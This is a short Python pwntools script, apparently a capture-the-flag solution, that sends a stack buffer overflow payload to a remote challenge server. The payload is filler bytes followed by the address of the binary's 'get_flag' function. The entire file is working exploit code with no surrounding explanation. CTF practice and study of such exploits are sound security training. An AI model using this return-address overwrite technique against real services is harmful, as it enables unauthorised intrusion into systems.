from pwn import *

r=remote("chals20.cybercastors.com",14425)
#r=process("./babybof")
b=ELF("./babybof")

pay=""
pay+='x'*0x100
pay+='x'*0x8
pay+=p64(b.symbols['get_flag'])

r.sendline(pay)
r.interactive()
